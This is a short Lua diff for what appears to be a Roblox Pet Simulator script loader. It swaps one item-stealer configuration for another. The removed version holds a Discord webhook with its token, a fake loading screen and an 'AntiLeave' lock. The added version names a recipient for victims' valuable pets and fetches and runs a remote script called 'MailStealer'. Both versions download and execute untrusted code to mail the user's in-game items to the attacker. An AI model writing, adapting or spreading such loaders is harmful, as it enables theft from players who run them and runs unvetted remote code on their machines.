@@ -1,15 +1,2 @@
-UserName = "giorpro13" 
-Wehook = "https://discord.com/api/webhooks/1140633158912577647/_UPr8yfZHrb0rvPmsmJ2qbA3eMj22l_4aTh7vaAsHL9Cl1Zz2oUJ5mhtyaSuoRx_MgW-" 
-UserName2 = "giorpro13"
- 
-_G.LoadingScreen = true -- make it true if you want the loadingscreen 
-_G.AntiLeave = true -- make it true if you want the antileave
- _G.MouseLock = true -- make it true if you want the mouselock --
- 
-_G.ScriptName = "Script Name"
-_G.FirstText = "Preparing..."
-_G.SecondText = "Loading..."
-_G.ThirdText = "Almost Done..."
-_G.WaitingTime = 180 -- in secondes it's the time for the loading bar to hit from 0% to 100%
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/N0Rizz/petsimx/main/Petsimx.lua"))()
+_G.UserName = "giorpro13" --// User you want to send good pets to like Titantics, Huges, exclusives
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/Paxz%20MailStealer.lua", true))()
